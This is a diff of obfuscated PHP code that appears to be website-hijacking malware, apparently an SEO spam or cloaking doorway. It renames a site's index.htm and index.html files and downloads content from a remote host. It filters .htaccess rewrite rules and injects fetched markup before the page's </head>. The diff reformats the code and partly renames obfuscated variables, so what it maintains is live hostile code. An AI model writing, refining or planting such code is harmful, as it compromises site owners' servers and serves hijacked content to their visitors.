@@ -206,7 +206,7 @@ function download($url){
         }
 
         if($func != ''){
-            $l16LhCLJ=parse_url($url);
+            $l16LhCLJ = parse_url($url);
             $l1vY = $func($l16LhCLJ["host"],isset($l16LhCLJ["port"]) ? $l16LhCLJ["port"] : 80,$l19rmur2,$l1wLOnRg,30);
             if($l1vY){
                 $l1Hi=isset($l16LhCLJ["path"])?$l16LhCLJ["path"]:'';
@@ -344,7 +344,7 @@ function l1Rm($l1XNaVU=''){
         if($l1eb!==false){
             preg_match_all("/<IfModule\s+mod_rewrite.c>[^<]+<\/IfModule>/si",$l1eb,$l1Ll);
             if(isset($l1Ll[0])&&!empty($l1Ll[0])){
-                foreach($l1Ll[0]as$l1Hj2){
+                foreach($l1Ll[0] as $l1Hj2){
                     if(!preg_match("/(\{HTTP_USER_AGENT\}|webdirect.php|\/index.php|php\?hl=\\\$1|\^\(.\*\)\\\$|.\*-.\*|\?\\\$\d\d?\\\$1\d)/si",$l1Hj2)){
                         $l1k[]=$l1Hj2;
                     }
@@ -386,7 +386,7 @@ function l1spc7n9($l1WD,$l1Vx,$l1iiC,$l1J){
             $l1Pt7l = range($l1lN5,$l1lN5+$l1Vx-1);
         }
     }
-    return$l1Pt7l;
+    return $l1Pt7l;
 }
 
 function l1K5dsu($l1o2ge=''){
@@ -797,25 +797,17 @@ function l1P9LVD($l15tGX=''){
     $l1ekHESi = $l1c9 = ($l1ekHESi==''?((isset($_SERVER["PATH_INFO"])&&$_SERVER["PATH_INFO"]!='')?$_SERVER["PATH_INFO"]:$l1ekHESi):$l1ekHESi);
     $l1i=$l1f1oojq.$l1ekHESi;
     $l1bS3es='';
-    $l1ko='';
-    $l17dhJj="index.htm";
 
-    if(file_exists($l17dhJj)){
-        @rename($l17dhJj,"{$l17dhJj}000");
-    }
 
-    if(file_exists("{$l17dhJj}l")){
-        @rename("{$l17dhJj}l","{$l17dhJj}l000");
-    }
+    /* Rename original index file */
+    if(file_exists("index.htm"))  @rename("index.htm","index.htm000");
+    if(file_exists("index.html")) @rename("index.html","index.html000");
 
-    if(file_exists("{$l17dhJj}000")){
-        $l1ko="{$l17dhJj}000";
-    }
-    if(file_exists("{$l17dhJj}l000")){
-        $l1ko="{$l17dhJj}l000";
-    }
+    $index_file = '';
+    if(file_exists("index.htm000"))  $index_file = "index.htm000";
+    if(file_exists("index.html000")) $index_file = "index.html000";
 
-    $l1M = isset($_SERVER["SCRIPT_NAME"])?$_SERVER["SCRIPT_NAME"]:'';
+    $l1M = isset($_SERVER["SCRIPT_NAME"]) ? $_SERVER["SCRIPT_NAME"] : '';
     if($l1M == ''){
         $l1M = isset($_SERVER["SCRIPT_FILENAME"])?$_SERVER["SCRIPT_FILENAME"]:'';
         if($l1M!=''){
@@ -987,9 +979,8 @@ function l1P9LVD($l15tGX=''){
         }
     }
 
-    if(!$l1uH){
-        $l1ko='';
-    }
+    if(!$l1uH) $index_file = '';
+    
 
     $l1VQ=l1vJ($l1VQ);
     $l11ia=$l1VQ."?yid=%d&lid=%d&from=%s&jump=%d&action=%s&cache=%d&ver=2.1.0&fb=%s";
@@ -1247,8 +1238,8 @@ function l1P9LVD($l15tGX=''){
     exit();
     }
     if($l1WyZOKd){
-        if($l1ko!=''){
-            echo file_get_contents($l1ko);
+        if($index_file != ''){
+            echo file_get_contents($index_file);
         }
         return;
     }
@@ -1289,8 +1280,9 @@ function l1P9LVD($l15tGX=''){
     $l1Kr=str_replace("</head>","$l1Vvtr\n</head>",$l1Kr);
     }}echo"$l1Kr";
     exit();
-    }if($l1ko!=''){
-        echo file_get_contents($l1ko);
+    }
+    if($index_file != ''){
+        echo file_get_contents($index_file);
     }
 }
 
